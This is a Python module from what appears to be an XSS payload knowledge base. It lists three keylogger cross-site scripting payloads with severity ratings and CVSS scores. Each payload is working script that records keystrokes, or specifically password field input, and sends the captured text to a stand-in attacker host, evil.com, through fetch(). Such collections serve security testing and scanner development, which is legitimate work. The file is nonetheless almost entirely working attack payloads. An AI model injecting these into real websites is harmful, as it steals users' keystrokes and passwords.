#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Keylogger XSS Payloads
"""

from ..models import PayloadEntry


KEYLOGGER_PAYLOADS = {
    "keylog_1": PayloadEntry(
        payload="<script>document.onkeypress=e=>fetch('//evil.com/?k='+e.key)</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Basic keylogger",
        tags=["keylogger", "keypress"],
        reliability="high",
    ),
    "keylog_2": PayloadEntry(
        payload="<script>let k='';document.onkeydown=e=>{k+=e.key;if(k.length>10){fetch('//evil.com/?k='+k);k=''}}</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Batched keylogger",
        tags=["keylogger", "keydown", "batch"],
        reliability="high",
    ),
    "keylog_3": PayloadEntry(
        payload="<script>document.addEventListener('input',e=>e.target.type!='password'||fetch('//evil.com/?p='+e.target.value))</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.5,
        description="Password field logger",
        tags=["keylogger", "password", "input"],
        reliability="high",
    ),
}

KEYLOGGER_PAYLOADS_TOTAL = len(KEYLOGGER_PAYLOADS)
